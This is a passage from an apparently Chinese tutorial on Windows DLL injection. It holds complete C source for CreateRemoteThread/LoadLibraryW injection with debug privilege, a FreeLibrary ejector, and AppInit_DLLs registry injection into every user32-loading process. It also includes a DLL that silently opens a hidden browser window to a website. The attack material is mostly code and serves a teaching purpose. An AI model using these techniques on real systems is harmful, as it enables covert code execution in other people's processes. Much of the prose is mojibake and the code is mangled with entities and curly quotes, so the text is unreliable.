hMod &#x3D; NULL; LPVOID pRemoteBuf &#x3D; NULL; DWORD dwBufSize &#x3D; (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR); LPTHREAD_START_ROUTINE pThreadProc; // #1. ä½¿ç”¨ dwPID è·å–ç›®æ ‡è¿›ç¨‹(notepad.exe)å¥æŸ„ï¼ˆPROCESS_ALL_ACCESSæƒé™ï¼‰ï¼Œç„¶åå°±å¯ä»¥ç”¨ hProcess æ§åˆ¶è¿›ç¨‹. if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) ) &#123; _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\\n&quot;, dwPID, GetLastError()); return FALSE; &#125; // #2. åœ¨ç›®æ ‡è¿›ç¨‹(notepad.exe) å†…å­˜ä¸­åˆ†é… szDllName å¤§å°çš„å†…å­˜ï¼Œè¿”å› pRemoteBuf ä½œä¸ºè¯¥ç¼“å†²åŒºçš„åœ°å€. pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE); // #3. å°† myhack.dll è·¯å¾„å†™å…¥åˆšåˆšåˆ†é…çš„ç¼“å†²åŒº. WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL); // #4. è·å– LoadLibraryW() API åœ°å€ï¼Œkernel32.dllåœ¨æ¯ä¸ªè¿›ç¨‹ä¸­çš„åŠ è½½åœ°å€ç›¸åŒï¼ˆè¿™ä¸ªç‰¹æ€§å°±æ˜¯æˆ‘ä»¬è¦åˆ©ç”¨çš„ï¼‰. hMod = GetModuleHandle(L&quot;kernel32.dll&quot;); pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, &quot;LoadLibraryW&quot;); // #5. åœ¨ notepad.exe ä¸­è¿è¡Œçº¿ç¨‹ hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL); //CreateRemoteThread()é©±ä½¿è¿›ç¨‹è°ƒç”¨LoadLibrary()ï¼Œè¿›è€ŒåŠ è½½æŒ‡å®šçš„DLLæ–‡ä»¶ WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); return TRUE; } int _tmain(int argc, TCHAR *argv[]){ if( argc !&#x3D; 3) { _tprintf(Lâ€USAGE : %s \\nâ€, argv[0]); return 1; } // change privilege if( !SetPrivilege(SE_DEBUG_NAME, TRUE) ) return 1; // inject dll if( InjectDll((DWORD)_tstol(argv[1]), argv[2]) ) _tprintf(L&quot;InjectDll(\\&quot;%s\\&quot;) success!!!\\n&quot;, argv[2]); else _tprintf(L&quot;InjectDll(\\&quot;%s\\&quot;) failed!!!\\n&quot;, argv[2]); return 0; } ä¸‹é¢æ¥è¯¦ç»†åˆ†æä¸€ä¸‹injectDllå‡½æ•°ã€‚ è°ƒç”¨ OpenProcessè¿™ä¸ªAPIï¼Œå€ŸåŠ©ç¨‹åºè¿è¡Œæ—¶ä»¥å‚æ•°å½¢åŠ¿ä¼ é€’è¿‡æ¥çš„dwPIDå€¼ï¼Œè·å–exeè¿›ç¨‹çš„å¥æŸ„ï¼ˆPROCESS_ALL_ACCESSï¼‰ã€‚å¾—åˆ°PROCESS_ALL_ACCESSä¹‹åï¼Œå°±å¯ä»¥ç”¨è·å–çš„å¥æŸ„æ§åˆ¶å¯¹åº”è¿›ç¨‹ã€‚ &#x2F;&#x2F;è·å–ç›®æ ‡çš„è¿›ç¨‹å¥æŸ„hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID) éœ€è¦æŠŠå³å°†åŠ è½½çš„dllæ–‡ä»¶çš„è·¯å¾„é€šçŸ¥ç›®æ ‡è¿›ç¨‹ã€‚å› ä¸ºä»»ä½•å†…å­˜ç©ºé—´éƒ½æ— æ³•è¿›è¡Œå†™å…¥æ“ä½œï¼Œæ‰€ä»¥å…ˆä½¿ç”¨VirtualAllocEx() APIåœ¨ç›®æ ‡è¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­åˆ†é…ä¸€å—ç¼“å†²åŒºï¼Œä¸”æŒ‡å®šçš„ç¼“å†²åŒºå¤§å°ä¸ºdllæ–‡ä»¶è·¯å¾„å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚ pRemoteBuf &#x3D; VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE); æç¤ºï¼šVirtualAllocEx()å‡½æ•°çš„è¿”å›å€¼ä¸ºåˆ†é…æ‰€å¾—ç¼“å†²åŒºçš„åœ°å€ã€‚è¯¥åœ°å€ä¸æ˜¯ç¨‹åºè‡ªèº«è¿›ç¨‹(Inject.exe)çš„å†…å­˜åœ°å€ï¼Œè€Œæ˜¯hProcesså¥æŸ„æ‰€æŒ‡ç›®æ ‡è¿›ç¨‹ï¼ˆnotepad.exeï¼‰çš„å†…å­˜åœ°å€ã€‚ ä½¿ç”¨WriteProcessMemoryå°†DLLè·¯å¾„å­—ç¬¦ä¸²ï¼ˆxxx\\xxx\\xxx.dllï¼‰å†™å…¥åˆ°åˆ†é…æ‰€å¾—ç¼“å†²åŒºåœ°å€ã€‚WriteProcessMemoryæ‰€å†™çš„å†…å­˜ç©ºé—´ä¹Ÿæ˜¯hProcesså¥æŸ„æ‰€æŒ‡çš„ç›®æ ‡è¿›ç¨‹çš„å†…å­˜ç©ºé—´ã€‚ WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL); &#x2F;&#x2F;è°ƒç”¨API &#x2F;&#x2F;Windowsæ“ä½œç³»ç»Ÿæä¾›äº†è°ƒè¯•APIï¼Œå€ŸåŠ©å…¶å¯ä»¥è®¿é—®å…¶å®ƒè¿›ç¨‹çš„å†…å­˜ç©ºé—´ã€‚ &#x2F;&#x2F;ä¾‹å¦‚ï¼šVirtualAllocEx()ã€ WriteProcessMemoryç­‰è°ƒç”¨LoadLibraryå‰éœ€è¦å…ˆè·å–å…¶åœ°å€ã€‚LoadLibraryW()æ˜¯LoadLibrary()çš„Unicodeå­—ç¬¦ä¸²ç‰ˆæœ¬ã€‚ æˆ‘ä»¬çš„ç›®æ ‡æ˜æ˜æ˜¯è·å–åŠ è½½åˆ° notepad.exe è¿›ç¨‹çš„kernel32.dllçš„ LoadLibraryWçš„èµ·å§‹åœ°å€ï¼Œä½†ä»£ç å´ç”¨æ¥è·å–åŠ è½½åˆ° InjectDll.exeè¿›ç¨‹çš„kernel32.dllçš„ LoadLibraryWçš„èµ·å§‹åœ°å€ã€‚å¦‚æœåŠ è½½åˆ° notepad.exe è¿›ç¨‹ä¸­çš„kernel32.dlçš„åœ°å€ä¸åŠ è½½åˆ° InjectDll.exe è¿›ç¨‹ä¸­çš„kernel32.dllçš„åœ°å€ç›¸åŒï¼Œé‚£ä¹ˆä¸Šé¢çš„ä»£ç å°±ä¸ä¼šæœ‰ä»€ä¹ˆé—®é¢˜ã€‚ä½†æ˜¯å¦‚æœkernell32.dåœ¨æ¯ä¸ªè¿›ç¨‹ä¸­åŠ è½½çš„åœ°å€éƒ½ä¸åŒï¼Œé‚£ä¹ˆä¸Šé¢çš„ä»£ç å°±é”™äº†ï¼Œæ‰§è¡Œæ—¶ä¼šå‘ç”Ÿå¼•ç”¨é”™è¯¯ã€‚ æ ¹æ® Os ç±»å‹ã€è¯­è¨€ã€ç‰ˆæœ¬ä¸åŒï¼Œkerne32.dllåŠ è½½çš„åœ°å€ä¹Ÿä¸ç½‘ã€‚å¹¶ä¸” Vista &#x2F;7ä¸­åº”ç”¨äº†æ–°çš„ ASLR åŠŸèƒ½ï¼Œæ¯æ¬¡å¯åŠ¨æ—¶ã€‚ç³»ç»Ÿ DLL åŠ è½½çš„åœ°å€éƒ½ä¼šæ”¹0ã€‚ä½†æ˜¯åœ¨ç³»ç»Ÿè¿è¡ŒæœŸé—´å®ƒéƒ½ä¼šè¢«æ˜ å°„ï¼ˆ Mapping ï¼‰åˆ°å·è¿›ç¨‹çš„ç›¸åŒåœ°å€ã€‚ Windows ä½œç³»ç»Ÿä¸­ï¼Œ DLL é¦–æ¬¡è¿›å…¥å†…å­˜ç§°ä¸ºâ€œåŠ è½½â€( Loading )ï¼Œä»¥åå…¶ä»–è¿›ç¨‹éœ€è¦ä½¿ç”¨ç›¸ç½‘ DLL æ—¶ä¸å¿…å†æ¬¡åŠ è½½ï¼Œåªè¦å°†åŠ è½½è¿‡çš„ DLL ä»£ç ä¸èµ„æºæ˜ å°„ä¸€ä¸‹å³å¯ï¼Œè¿™ç§æ˜ å°„æŠ€æœ¯æœ‰åˆ©äºæé«˜è‚‰å­˜çš„ä½¿ç”¨æ•ˆç‡ã€‚ åƒä¸Šé¢è¿™æ ·ï¼Œ OS æ ¸å¿ƒ DUL ä¼šè¢«åŠ è½½åˆ°è‡ªèº«å›ºæœ‰çš„åœ°å€ï¼Œ DLL æ³¨äººåˆ©ç”¨çš„å°±æ˜¯ Windows Os è¿™ä¸€ç‰¹æ€§ï¼ˆè¯¥ç‰¹æ€§ä¹Ÿå¯èƒ½ä¼šè¢«æ¶æ„ä½¿ç”¨ï¼Œæˆä¸º Windows å®‰å…¨æ¼æ´ï¼‰ã€‚å¯¼äººInjectDll.exeè¿›ç¨‹ä¸­LoadlibraryWåœ°å€ä¸å¯¼äººnotepad.exeè¿›ç¨‹ä¸­çš„LoadLibraryWOåœ°å€æ˜¯ç›¸åŒçš„ã€‚ &#x2F;&#x2F;åœ¨windowsä¸­ï¼Œkernel32.dllåœ¨æ¯ä¸ªè¿›ç¨‹ä¸­çš„åŠ è½½åœ°å€æ˜¯ç›¸åŒçš„ã€‚hMod &#x3D; GetModuleHandle(Lâ€kernel32.dllâ€);pThreadProc &#x3D; (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, â€œLoadLibraryWâ€); åœ¨ç›®æ ‡è¿›ç¨‹ä¸­è¿è¡Œè¿œç¨‹çº¿ç¨‹ï¼ŒpThreadProcæ˜¯exeè¿›ç¨‹å†…å­˜ä¸­LoadlibraryWçš„åœ°å€ï¼ŒpRemoteBufæ˜¯exeè¿›ç¨‹å†…å­˜ä¸­dllå­—ç¬¦ä¸²çš„åœ°å€ã€‚ hThread &#x3D; CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL); CreateRemoteThreadç”¨æ¥åœ¨ç›®æ ‡è¿›ç¨‹ä¸­æ‰§è¡Œå…¶åˆ›å»ºçš„çº¿ç¨‹ï¼Œå…¶å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š é™¤ç¬¬ä¸€ä¸ªå‚æ•° hProcess å¤–ï¼Œå…¶ä»–å‚æ•°ä¸ CreateThread (ï¼‰å‡½æ•°å®Œå…¨ä¸€æ ·ã€‚ hProcess å‚æ•°æ˜¯è¦æ‰§è¡Œçº¿ç¨‹çš„ç›®æ ‡è¿›ç¨‹ï¼ˆæˆ–ç§°â€œè¿œç¨‹è¿›ç¨‹â€ã€â€œå®¿ä¸»è¿›ç¨‹â€ï¼‰çš„å¥æŸ„ã€‚ IpStartAddress ä¸ IpParameter å‚æ•°åˆ†åˆ«ç»™å‡ºçº¿ç¨‹å‡½æ•°åœ°å€ä¸çº¿ç¨‹å‚æ•°åœ°å€ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™2ä¸ªåœ°å€éƒ½åº”è¯¥åœ¨ç›®æ ‡è¿›ç¨‹è™šæ‹Ÿå†…å­˜ç©ºé—´ä¸­ï¼ˆè¿™æ ·ç›®æ ‡è¿›ç¨‹æ‰èƒ½è®¤è¯†å®ƒä»¬ï¼‰ã€‚ HANDLE CreateRemoteThread( &#x2F;&#x2F; è¿›ç¨‹å¥æŸ„ hProcess, &#x2F;&#x2F; çº¿ç¨‹å®‰å…¨æè¿°å­—ï¼ŒæŒ‡å‘SECURITY_ATTRIBUTESç»“æ„çš„æŒ‡é’ˆ LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, &#x2F;&#x2F; çº¿ç¨‹æ ˆå¤§å°ï¼Œä»¥å­—èŠ‚è¡¨ç¤º LPTHREAD_START_ROUTINE lpStartAddress, &#x2F;&#x2F; æŒ‡å‘åœ¨è¿œç¨‹è¿›ç¨‹ä¸­æ‰§è¡Œçš„å‡½æ•°åœ°å€ LPVOID lpParameter, &#x2F;&#x2F; ä¼ å…¥å‚æ•° DWORD dwCreationFlags, &#x2F;&#x2F; åˆ›å»ºçº¿ç¨‹çš„å…¶å®ƒæ ‡å¿— LPDWORD lpThreadId &#x2F;&#x2F; çº¿ç¨‹èº«ä»½æ ‡å¿—ï¼Œå¦‚æœä¸ºNULL,åˆ™ä¸è¿”å›); HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); æŸ¥çœ‹ThreadProcä¸LoadLibraryã€‚ä¸¤å‡½æ•°éƒ½æœ‰ä¸€ä¸ª4å­—èŠ‚çš„å‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ª4å­—èŠ‚çš„å€¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒäºŒè€…å½¢æ€ç»“æ„å®Œå…¨ä¸€æ ·çµæ„Ÿå³æºäºæ­¤ã€‚è°ƒç”¨ CreateRemoteThread æ—¶ï¼Œåªè¦å°† LoadLibraryå‡½æ•°çš„åœ°å€ä¼ é€’ç»™ç¬¬å››ä¸ªå‚æ•° IpStartAddress ï¼ŒæŠŠè¦æ³¨äººçš„ DLL çš„è·¯å¾„å­—ç¬¦ä¸²åœ°å€ä¼ é€’ç»™ç¬¬äº”ä¸ªå‚æ•° IpParameter å³å¯ï¼ˆå¿…é¡»æ˜¯ç›®æ ‡è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜ç©ºé—´ä¸­çš„åœ°å€ï¼‰ã€‚ç”±äºå‰é¢å·²ç»åšå¥½äº†ä¸€åˆ‡å‡†å¤‡ï¼Œç°åœ¨è°ƒç”¨è¯¥å‡½æ•°ä½¿ç›®æ ‡è¿›ç¨‹åŠ è½½æŒ‡å®šçš„ DLL æ–‡ä»¶å°±è¡Œäº†ã€‚ CreateRemoteThread ï¼ˆå‡½æ•°æœ€ä¸»è¦çš„åŠŸèƒ½å°±æ˜¯é©±ä½¿ç›®æ ‡è¿›ç¨‹è°ƒç”¨LoadLibraryå‡½æ•°ï¼Œè¿›è€ŒåŠ è½½æŒ‡å®šçš„ DLL æ–‡ä»¶ã€‚ &#x2F;&#x2F;è°ƒç”¨ CreateRemoteThread åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ‰€éœ€è¦çš„è¿‡ç¨‹å‡½æ•°çš„æ ‡å‡†å½¢å¼ä¸ºDWORD WINAPI ThreadProc( In LPVOID lpParameter); &#x2F;&#x2F;Win32ç¼–ç¨‹åŠ è½½DLLçš„APIä¸ºï¼šHMODULE WINAPI LoadLibrary( In LPCTSTR lpFileName); å››ã€DLLå¸è½½ DLLå¸è½½ï¼ˆDLL Ejectionï¼‰ï¼šå°†å¼ºåˆ¶æ’å…¥è¿›ç¨‹çš„DLLå¼¹å‡ºçš„æŠ€æœ¯ã€‚ åŸç†ï¼šé©±ä½¿ç›®æ ‡è¿›ç¨‹è°ƒç”¨FreeLibrary() APIã€‚ æç¤ºï¼šFreeLibraryå¸è½½dllçš„æ–¹æ³•åªé€‚ç”¨äºCreateRemoteThreadæ³¨å…¥ å…ˆæ³¨å…¥dllåˆ°ç›®æ ‡è¿›ç¨‹ æ³¨å…¥æˆåŠŸåï¼Œå¸è½½dll åˆ†æä¸€ä¸‹EjectDll.exe #include â€œwindows.hâ€#include â€œtlhelp32.hâ€#include â€œtchar.hâ€ #define DEF_PROC_NAME (Lâ€notepad.exeâ€)#define DEF_DLL_NAME (Lâ€myhack.dllâ€) DWORD FindProcessID(LPCTSTR szProcessName){ DWORD dwPID &#x3D; 0xFFFFFFFF; HANDLE hSnapShot &#x3D; INVALID_HANDLE_VALUE; PROCESSENTRY32 pe; // Get the snapshot of the system pe.dwSize = sizeof( PROCESSENTRY32 ); hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL ); // find process Process32First(hSnapShot, &amp;pe); do &#123; if(!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile)) &#123; dwPID = pe.th32ProcessID; break; &#125; &#125; while(Process32Next(hSnapShot, &amp;pe)); CloseHandle(hSnapShot); return dwPID; } BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege){ TOKEN_PRIVILEGES tp; HANDLE hToken; LUID luid; if( !OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken) ) &#123; _tprintf(L&quot;OpenProcessToken error: %u\\n&quot;, GetLastError()); return FALSE; &#125; if( !LookupPrivilegeValue(NULL, // lookup privilege on local system lpszPrivilege, // privilege to lookup &amp;luid) ) // receives LUID of privilege &#123; _tprintf(L&quot;LookupPrivilegeValue error: %u\\n&quot;, GetLastError() ); return FALSE; &#125; tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; if( bEnablePrivilege ) tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; else tp.Privileges[0].Attributes = 0; // Enable the privilege or disable all privileges. if( !AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) &#123; _tprintf(L&quot;AdjustTokenPrivileges error: %u\\n&quot;, GetLastError() ); return FALSE; &#125; if( GetLastError() == ERROR_NOT_ALL_ASSIGNED ) &#123; _tprintf(L&quot;The token does not have the specified privilege. \\n&quot;); return FALSE; &#125; return TRUE; } BOOL EjectDll(DWORD dwPID, LPCTSTR szDllName){ BOOL bMore &#x3D; FALSE, bFound &#x3D; FALSE; HANDLE hSnapshot, hProcess, hThread; HMODULE hModule &#x3D; NULL; MODULEENTRY32 me &#x3D; { sizeof(me) }; LPTHREAD_START_ROUTINE pThreadProc; // dwPID = notepad è¿›ç¨‹ ID // ä½¿ç”¨ TH32CS_SNAPMODULE å‚æ•°ï¼Œè·å–åŠ è½½åˆ° notepad è¿›ç¨‹çš„ DLLåç§° hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID); bMore = Module32First(hSnapshot, &amp;me); for( ; bMore ; bMore = Module32Next(hSnapshot, &amp;me) ) &#123; if( !_tcsicmp((LPCTSTR)me.szModule, szDllName) || !_tcsicmp((LPCTSTR)me.szExePath, szDllName) ) &#123; bFound = TRUE; break; &#125; &#125; if( !bFound ) &#123; CloseHandle(hSnapshot); return FALSE; &#125; if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) ) //ä½¿ç”¨è¿›ç¨‹IDæ¥è·å–ç›®æ ‡è¿›ç¨‹çš„è¿›ç¨‹å¥æŸ„ &#123; _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\\n&quot;, dwPID, GetLastError()); return FALSE; &#125; //è·å–åŠ è½½åˆ°EjectDll.exeè¿›ç¨‹çš„kernel32.FreeLibraryåœ°å€ï¼ˆè¿™ä¸ªåœ°å€åœ¨æ‰€æœ‰è¿›ç¨‹ä¸­æ˜¯ä¸€æ ·çš„ï¼‰ hModule = GetModuleHandle(L&quot;kernel32.dll&quot;); pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, &quot;FreeLibrary&quot;); //åœ¨ç›®æ ‡è¿›ç¨‹ä¸­è¿è¡Œçº¿ç¨‹ï¼ŒpThreadProcæ˜¯FreeLibraryåœ°å€ï¼Œme.modBaseAddræ˜¯è¦å¸è½½çš„DLLçš„åŠ è½½åœ°å€ hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, me.modBaseAddr, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); CloseHandle(hSnapshot); return TRUE; } int _tmain(int argc, TCHAR* argv[]){ DWORD dwPID &#x3D; 0xFFFFFFFF; // find process dwPID = FindProcessID(DEF_PROC_NAME); if( dwPID == 0xFFFFFFFF ) &#123; _tprintf(L&quot;There is no &lt;%s&gt; process!\\n&quot;, DEF_PROC_NAME); return 1; &#125; _tprintf(L&quot;PID of \\&quot;%s\\&quot; is %d\\n&quot;, DEF_PROC_NAME, dwPID); // change privilege if( !SetPrivilege(SE_DEBUG_NAME, TRUE) ) return 1; // eject dll if( EjectDll(dwPID, DEF_DLL_NAME) ) _tprintf(L&quot;EjectDll(%d, \\&quot;%s\\&quot;) success!!!\\n&quot;, dwPID, DEF_DLL_NAME); else _tprintf(L&quot;EjectDll(%d, \\&quot;%s\\&quot;) failed!!!\\n&quot;, dwPID, DEF_DLL_NAME); return 0; } è·å–è¿›ç¨‹ä¸­åŠ è½½çš„DLLä¿¡æ¯ã€‚ hSnapshot &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);&#x2F;&#x2F;ä½¿ç”¨ Create Toolhelp32Snapshot0 API å¯ä»¥è·å–åŠ è½½åˆ°è¿›ç¨‹çš„æ¨¡å—ï¼ˆ DLL ï¼‰ä¿¡æ¯ã€‚&#x2F;&#x2F;å°†è·å–çš„ hSnapshot å¥æŸ„ä¼ é€’ç»™Module32First(Module32NextOå‡½æ•°åï¼Œ&#x2F;&#x2F;å³å¯è®¾ç½®ä¸MODULEENTRY32ç»“æ„ä½“ç›¸å…³çš„æ¨¡å—ä¿¡æ¯. è·å–ç›®æ ‡è¿›ç¨‹çš„å¥æŸ„ã€‚ hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)&#x2F;&#x2F;ä½¿ç”¨pidè·å–ç›®æ ‡è¿›ç¨‹çš„è¿›ç¨‹å¥æŸ„ è·å–FreeLibrary APIåœ°å€ hModule &#x3D; GetModuleHandle(Lâ€kernel32.dllâ€); pThreadProc &#x3D; (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, â€œFreeLibraryâ€); &#x2F;&#x2F;è‹¥è¦é©±ä½¿ notepad è¿›ç¨‹è‡ªå·±è°ƒç”¨ FreeLibrary API ï¼Œéœ€è¦å…ˆå¾—åˆ° FreeLibraryçš„åœ°å€ã€‚ &#x2F;&#x2F;ç„¶è€Œä»£ç è·å–çš„ä¸æ˜¯åŠ è½½åˆ° notepad.exe è¿›ç¨‹ä¸­çš„Kernel32!FreeLibrary åœ°å€ï¼Œ&#x2F;&#x2F; è€Œæ˜¯åŠ è½½åˆ° EjectDl . exei ç¨‹ä¸­çš„Kernel32! FreeLibrary åœ°å€ã€‚ åœ¨ç›®æ ‡è¿›ç¨‹ä¸­è¿è¡Œçº¿ç¨‹ hThread &#x3D; CreateRemoteThread(hProcess, NULL, 0, pThreadProc, me.modBaseAddr, 0, NULL);&#x2F;&#x2F;pThreadProc å‚æ•°æ˜¯ FreeLibrary API çš„åœ°å€,&#x2F;&#x2F;me.modBaseAddr å‚æ•°æ˜¯è¦å¸è½½çš„ DLL çš„åŠ è½½åœ°å€ã€‚&#x2F;&#x2F;å°†çº¿ç¨‹å‡½æ•°æŒ‡å®šä¸º FreeLibrary å‡½æ•°ï¼Œå¹¶æŠŠ DLL åŠ è½½åœ°å€ä¼ é€’ç»™çº¿ç¨‹å‚æ•°ï¼Œ&#x2F;&#x2F;å°±åœ¨ç›®ç§°ä¸–ä¸­æˆåŠŸè°ƒç”¨äº† FreeLibraryO ) API ã€‚ äº”ã€AppInit_DLLss è®¡ç®—æœº\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows å¡«å…¥dllæ–‡ä»¶è·¯å¾„ ä¿®æ”¹LoadAppInit_DLLs é‡å¯ç³»ç»Ÿä½¿ä¿®æ”¹ç”Ÿæ•ˆï¼Œä½¿ç”¨ç«ç»’å‰‘ï¼Œprocess exploreræŸ¥çœ‹æ˜¯å¦æ³¨å…¥æˆåŠŸã€‚å¯ä»¥çœ‹è§å·²ç»è¢«æ³¨æ³¨å…¥æˆåŠŸäº†ã€‚å¹¶ä¸”æ˜¯æ³¨å…¥äº†æ‰€æœ‰åŠ è½½äº†user32.dllçš„è¿›ç¨‹ã€‚ä½†æ˜¯ç”±äºæ­¤dllçš„ç›®æ ‡æ˜¯notepad.exeè¿›ç¨‹ï¼Œæ‰€ä»¥åªè¦å½“è¿è¡Œè¿™ä¸ªexeä¹‹åæ‰ä¼šæœ‰æ‰€åŠ¨ä½œã€‚ myhack2.dllçš„æºç æ¯”è¾ƒç®€å•ã€‚ä¸»è¦ç›®çš„ä¸ºåŠ è½½è¿›ç¨‹ä¸ºnotepad.exeçš„ç¨‹åºï¼Œç„¶åéšè—å¹¶è¿æ¥æŒ‡å®šç½‘ç«™ã€‚ &#x2F;&#x2F; myhack2.cpp #include â€œwindows.hâ€#include â€œtchar.hâ€ #define DEF_CMD Lâ€c:\\Program Files\\Internet Explorer\\iexplore.exeâ€#define DEF_ADDR Lâ€http://www.naver.comâ€œ#define DEF_DST_PROC Lâ€notepad.exeâ€ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){ TCHAR szCmd[MAX_PATH] &#x3D; {0,}; TCHAR szPath[MAX_PATH] &#x3D; {0,}; TCHAR *p &#x3D; NULL; STARTUPINFO si &#x3D; {0,}; PROCESS_INFORMATION pi &#x3D; {0,}; si.cb = sizeof(STARTUPINFO); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; switch( fdwReason ) &#123; case DLL_PROCESS_ATTACH : if( !GetModuleFileName( NULL, szPath, MAX_PATH ) ) break; if( !(p = _tcsrchr(szPath, &#39;\\\\&#39;)) ) break; if( _tcsicmp(p+1, DEF_DST_PROC) ) break; wsprintf(szCmd, L&quot;%s %s&quot;, DEF_CMD, DEF_ADDR); if( !CreateProcess(NULL, (LPTSTR)(LPCTSTR)szCmd, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &amp;si, &amp;pi) ) break; if( pi.hProcess != NULL ) CloseHandle(pi.hProcess); break; &#125; return TRUE; } å…­ã€SetWindowsHooKEXï¼ˆï¼‰ é’©å­è¿‡ç¨‹ï¼ˆhook procedureï¼‰æ˜¯ç³»ç»Ÿè°ƒç”¨çš„å›è°ƒå‡½æ•°ã€‚ å®‰è£…é’©å­æ—¶ï¼Œé’©å­è¿‡ç¨‹éœ€è¦åœ¨DLLå†…éƒ¨ï¼Œè¯¥DLLçš„ç¤ºä¾‹å¥æŸ„ï¼ˆinstance handleï¼‰å³hModã€‚ çº¿ç¨‹IDå¦‚æœä¸º0ï¼Œåˆ™é’©å­ä¸ºâ€œå…¨å±€é’©å­â€ã€‚ ç”¨SetWindowsHookEx()è®¾ç½®å¥½é’©å­åï¼Œåœ¨æŸä¸ªè¿›ç¨‹ä¸­ç”ŸæˆæŒ‡å®šæ¶ˆæ¯æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šå°†ç›¸å…³DLLæ–‡ä»¶å¼ºåˆ¶æ³¨å…¥ç›¸åº”è¿›ç¨‹ã€‚ HHOOK SetWindowsHookEx( int idHook, &#x2F;&#x2F; é’©å­çš„ç±»å‹ï¼Œå³å®ƒå¤„ç†çš„æ¶ˆæ¯ç±»å‹ HOOKPROC lpfn, &#x2F;&#x2F;é’©å­å­ç¨‹çš„åœ°å€æŒ‡é’ˆã€‚å¦‚æœdwThreadIdå‚æ•°ä¸º0 &#x2F;&#x2F; æˆ–æ˜¯ä¸€ä¸ªç”±åˆ«çš„è¿›ç¨‹åˆ›å»ºçš„çº¿ç¨‹çš„æ ‡è¯†ï¼Œ &#x2F;&#x2F; lpfnå¿…é¡»æŒ‡å‘DLLä¸­çš„é’©å­å­ç¨‹ã€‚ &#x2F;&#x2F; é™¤æ­¤ä»¥å¤–ï¼Œlpfnå¯ä»¥æŒ‡å‘å½“å‰è¿›ç¨‹çš„ä¸€æ®µé’©å­å­ç¨‹ä»£ç ã€‚ &#x2F;&#x2F;é’©å­å‡½æ•°çš„å…¥å£åœ°å€ï¼Œå½“é’©å­é’©åˆ°ä»»ä½•æ¶ˆæ¯åä¾¿è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚ HINSTANCE hMod, &#x2F;&#x2F;åº”ç”¨ç¨‹åºå®ä¾‹çš„å¥æŸ„ã€‚æ ‡è¯†åŒ…å«lpfnæ‰€æŒ‡çš„å­ç¨‹çš„DLLã€‚ &#x2F;&#x2F; å¦‚æœdwThreadId æ ‡è¯†å½“å‰è¿›ç¨‹åˆ›å»ºçš„ä¸€ä¸ªçº¿ç¨‹ï¼Œ &#x2F;&#x2F; è€Œä¸”å­ç¨‹ä»£ç ä½äºå½“å‰è¿›ç¨‹ï¼ŒhModå¿…é¡»ä¸ºNULLã€‚ &#x2F;&#x2F; å¯ä»¥å¾ˆç®€å•çš„è®¾å®šå…¶ä¸ºæœ¬åº”ç”¨ç¨‹åºçš„å®ä¾‹å¥æŸ„ã€‚ DWORD dwThreadId &#x2F;&#x2F;ä¸å®‰è£…çš„é’©å­å­ç¨‹ç›¸å…³è”çš„çº¿ç¨‹çš„æ ‡è¯†ç¬¦ã€‚ &#x2F;&#x2F; å¦‚æœä¸º0ï¼Œé’©å­å­ç¨‹ä¸æ‰€æœ‰çš„çº¿ç¨‹å…³è”ï¼Œå³ä¸ºå…¨å±€é’©å­ã€‚ ); 6.1ã€æ•ˆæœç¤ºæ„ é¦–å…ˆè¿è¡ŒHookMain.exe 